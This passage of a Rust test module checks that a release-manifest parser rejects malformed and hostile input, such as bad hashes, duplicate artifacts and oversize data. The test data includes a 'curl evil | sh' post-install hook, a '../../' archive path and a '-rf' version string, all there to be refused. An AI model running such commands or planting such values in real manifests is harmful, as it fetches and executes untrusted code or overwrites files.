                |m| m.products[2].actions[0].subject = "-x".into(),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "init_credentials by profile",
                |m| {
                    m.products[4].actions[1].by_profile = vec![Profile::Lab];
                },
                |e| matches!(e, ManifestError::ByProfileForbidden { .. }),
            ),
            (
                "by_profile outside planned_in",
                |m| {
                    m.products[2].actions[0].by_profile.push(Profile::Minimal);
                },
                |e| matches!(e, ManifestError::ByProfileOutsidePlannedIn { .. }),
            ),
            (
                "unit not shipped",
                |m| m.products[2].files.clear(),
                |e| matches!(e, ManifestError::UnitNotShipped { .. }),
            ),
            (
                "duplicate action",
                |m| {
                    let a = m.products[2].actions[0].clone();
                    m.products[2].actions.push(a);
                },
                |e| matches!(e, ManifestError::DuplicateAction { .. }),
            ),
            (
                "duplicate profile",
                |m| {
                    let p = m.profiles[0].clone();
                    m.profiles.push(p);
                },
                |e| matches!(e, ManifestError::DuplicateProfile(_)),
            ),
            (
                "profile without ferroloop",
                |m| m.profiles[0].products.clear(),
                |e| matches!(e, ManifestError::ProfileMissingRequired { .. }),
            ),
            (
                "lab lacks a full product",
                |m| m.profiles[3].products.retain(|p| p != "ferrodeck"),
                |e| matches!(e, ManifestError::LabNotSuperset(v) if v == &["ferrodeck".to_string()]),
            ),
            (
                "lab does not plan a full action",
                |m| {
                    m.products[1].actions[0].planned_in = vec![Profile::Full];
                },
                |e| matches!(e, ManifestError::LabNotSuperset(_)),
            ),
            (
                "bad version",
                |m| m.release.version = "1.0+x".into(),
                |e| matches!(e, ManifestError::BadVersion(_)),
            ),
            (
                "version is the current directory",
                |m| m.release.version = ".".into(),
                |e| matches!(e, ManifestError::BadVersion(_)),
            ),
            (
                "version is the parent directory",
                |m| m.release.version = "..".into(),
                |e| matches!(e, ManifestError::BadVersion(_)),
            ),
            (
                "version starts with a dash",
                |m| m.release.version = "-rf".into(),
                |e| matches!(e, ManifestError::BadVersion(_)),
            ),
            (
                "bad commit",
                |m| m.release.commit = Some("abc".into()),
                |e| matches!(e, ManifestError::BadCommit(_)),
            ),
            (
                "compat range inverted",
                |m| m.compat.store_format_min = 99,
                |e| matches!(e, ManifestError::BadCompat(_)),
            ),
            (
                "source build with artifacts",
                |m| {
                    *m = {
                        let mut s = signed_manifest();
                        s.release.kind = ReleaseKind::SourceBuild;
                        s
                    }
                },
                |e| matches!(e, ManifestError::ReleaseKind(_)),
            ),
            (
                "release without commit",
                |m| {
                    *m = signed_manifest();
                    m.release.commit = None;
                },
                |e| matches!(e, ManifestError::ReleaseKind(_)),
            ),
            (
                "release without artifacts",
                |m| {
                    *m = signed_manifest();
                    m.artifacts.clear();
                },
                |e| matches!(e, ManifestError::ReleaseKind(_)),
            ),
            (
                "duplicate artifact id",
                |m| {
                    *m = signed_manifest();
                    let mut a = m.artifacts[0].clone();
                    a.file = "other.tar".into();
                    m.artifacts.push(a);
                },
                |e| matches!(e, ManifestError::DuplicateArtifact(_)),
            ),
            (
                "duplicate artifact file",
                |m| {
                    *m = signed_manifest();
                    let mut a = m.artifacts[0].clone();
                    a.id = "second".into();
                    m.artifacts.push(a);
                },
                |e| matches!(e, ManifestError::DuplicateArtifact(_)),
            ),
            (
                "two artifacts for one product and target",
                |m| {
                    *m = signed_manifest();
                    let mut a = m.artifacts[0].clone();
                    a.id = "second".into();
                    a.file = "second.tar".into();
                    m.artifacts.push(a);
                },
                |e| matches!(e, ManifestError::AmbiguousArtifact { .. }),
            ),
            (
                "bad hash",
                |m| {
                    *m = signed_manifest();
                    m.artifacts[0].sha256 = "A".repeat(64);
                },
                |e| matches!(e, ManifestError::BadHash { .. }),
            ),
            (
                "short hash",
                |m| {
                    *m = signed_manifest();
                    m.artifacts[0].sha256 = "abc".into();
                },
                |e| matches!(e, ManifestError::BadHash { .. }),
            ),
            (
                "zero size",
                |m| {
                    *m = signed_manifest();
                    m.artifacts[0].size = 0;
                },
                |e| matches!(e, ManifestError::BadSize { .. }),
            ),
            (
                "unbounded size",
                |m| {
                    *m = signed_manifest();
                    m.artifacts[0].size = MAX_ARTIFACT_BYTES + 1;
                },
                |e| matches!(e, ManifestError::BadSize { .. }),
            ),
            (
                "absolute archive path",
                |m| {
                    *m = signed_manifest();
                    m.artifacts[0].file = "/tmp/x".into();
                },
                |e| matches!(e, ManifestError::BadPath { .. }),
            ),
            (
                "dotdot archive path",
                |m| {
                    *m = signed_manifest();
                    m.artifacts[0].file = "a/../../x".into();
                },
                |e| matches!(e, ManifestError::BadPath { .. }),
            ),
            (
                "artifact provides unknown product",
                |m| {
                    *m = signed_manifest();
                    m.artifacts[0].provides.push("ferroflow".into());
                },
                |e| matches!(e, ManifestError::UnknownProduct { .. }),
            ),
            (
                "too many artifacts",
                |m| {
                    *m = signed_manifest();
                    for i in 0..70 {
                        let mut a = m.artifacts[0].clone();
                        a.id = format!("a{i}");
                        a.file = format!("a{i}.tar");
                        m.artifacts.push(a);
                    }
                },
                |e| {
                    matches!(
                        e,
                        ManifestError::TooMany {
                            what: "artifacts",
                            ..
                        }
                    )
                },
            ),
            (
                "too many files",
                |m| {
                    for i in 0..70 {
                        m.products[0].files.push(ProductFile {
                            path: format!("bin/f{i}"),
                            kind: FileKind::Binary,
                        });
                    }
                },
                |e| {
                    matches!(
                        e,
                        ManifestError::TooMany {
                            what: "files per product",
                            ..
                        }
                    )
                },
            ),
        ];
        for (name, mutate, expect) in cases {
            let mut m = default_manifest();
            mutate(&mut m);
            let errs = m
                .validate()
                .expect_err(&format!("case `{name}` must be rejected"));
            assert!(
                errs.iter().any(expect),
                "case `{name}` was rejected for the wrong reason: {errs:?}"
            );
        }
    }

    #[test]
    fn parse_refuses_a_newer_schema_before_reading_the_rest() {
        let mut v = serde_json::to_value(default_manifest()).unwrap();
        v["schema_version"] = 2.into();
        v["a_field_from_the_future"] = true.into();
        assert_eq!(
            ReleaseManifest::parse(&v.to_string()),
            Err(vec![ManifestError::UnsupportedSchema { found: 2 }])
        );
        let mut v = serde_json::to_value(default_manifest()).unwrap();
        v.as_object_mut().unwrap().remove("schema_version");
        assert!(matches!(
            ReleaseManifest::parse(&v.to_string()).unwrap_err()[0],
            ManifestError::Malformed(_)
        ));
    }

    #[test]
    fn parse_refuses_unknown_fields_garbage_and_oversize_input() {
        let mut v = serde_json::to_value(default_manifest()).unwrap();
        v["products"][0]["post_install"] = "curl evil | sh".into();
        assert!(matches!(
            ReleaseManifest::parse(&v.to_string()).unwrap_err()[0],
            ManifestError::Malformed(ref m) if m.contains("unknown field")
        ));
        assert!(ReleaseManifest::parse("not json").is_err());
        assert!(matches!(
            ReleaseManifest::parse(&" ".repeat(MAX_MANIFEST_BYTES + 1)).unwrap_err()[0],
            ManifestError::TooLarge { .. }
        ));
    }

    #[test]
    fn no_action_is_both_explicit_only_and_profile_approved_in_the_default_manifest() {
        for e in &default_manifest().products {
            for a in &e.actions {
                if a.kind.explicit_only() {
                    assert!(a.by_profile.is_empty(), "{}:{}", e.id, a.subject);
                }
            }
        }
    }

    #[test]
    fn every_default_profile_product_is_declared_and_lab_contains_full() {
        let m = default_manifest();
        let full = m.profile_products(Profile::Full).unwrap();
        let lab = m.profile_products(Profile::Lab).unwrap();
        assert!(full.is_subset(&lab));
        assert_eq!(full.len(), 8, "full is every product the user can pick");
        assert!(m.profile_products(Profile::Minimal).unwrap().len() == 1);
    }

    // ---- source builds with provenance (#205 A4b)

    fn provenance() -> BuildProvenance {
        BuildProvenance {
            reviewed: true,
            rustc: "rustc 1.98.0 (abc 2026-01-01)".into(),
            cargo: "cargo 1.98.0 (def 2026-01-01)".into(),
            build_id: "0123456789ab-fedcba987654".into(),
            build_time_unix: 1_700_000_000,
        }
    }

    fn source_build() -> ReleaseManifest {
        let mut m = default_manifest();
        m.release.commit = Some("0123456789abcdef0123456789abcdef01234567".into());
        m.release.build = Some(provenance());
        m
    }

    #[test]
    fn a_source_build_names_its_provenance_and_at_most_one_artifact() {
        // plan-only (the dry run): provenance, no artifact
        assert_eq!(source_build().validate(), Ok(()));
        // built: exactly the one artifact
        let mut m = source_build();
        m.artifacts = signed_manifest().artifacts;
        assert_eq!(m.validate(), Ok(()));
        // two artifacts
        let mut two = m.clone();
        let mut b = two.artifacts[0].clone();
        b.id = "other".into();
        b.file = "other".into();
        two.artifacts.push(b);
        assert!(
            two.validate()
                .unwrap_err()
                .iter()
                .any(|e| matches!(e, ManifestError::ReleaseKind(_)))
        );
        // artifacts without provenance stay refused
        let mut bare = m.clone();
        bare.release.build = None;
        assert!(
            bare.validate()
                .unwrap_err()
                .iter()
                .any(|e| matches!(e, ManifestError::ReleaseKind(_)))
        );
        // a source build names its commit
        let mut nocommit = source_build();
        nocommit.release.commit = None;
        assert!(
            nocommit
                .validate()
                .unwrap_err()
                .iter()
                .any(|e| matches!(e, ManifestError::ReleaseKind(_)))
        );
        // a signed release carries no source-build provenance
        let mut rel = signed_manifest();
        rel.release.build = Some(provenance());
        assert!(
            rel.validate()
                .unwrap_err()
                .iter()
                .any(|e| matches!(e, ManifestError::ReleaseKind(_)))
        );
        // the record itself is bounded text
        for mutate in [
            (|b: &mut BuildProvenance| b.rustc = String::new()) as fn(&mut BuildProvenance),
            |b| b.cargo = "x\ny".into(),
            |b| b.rustc = "x".repeat(MAX_TOOL_LINE + 1),
            |b| b.build_id = "a b".into(),
        ] {
            let mut bad = source_build();
            mutate(bad.release.build.as_mut().unwrap());
            assert!(
                bad.validate()
                    .unwrap_err()
                    .iter()
                    .any(|e| matches!(e, ManifestError::BadBuild(_)))
            );
        }
    }

    #[test]
    fn a_manifest_without_provenance_is_unchanged_on_the_wire() {
        let json = default_manifest().to_json();
        assert!(
            !json.contains("\"build\""),
            "an absent block is not written"
        );
        assert_eq!(ReleaseManifest::parse(&json).unwrap(), default_manifest());
    }
}
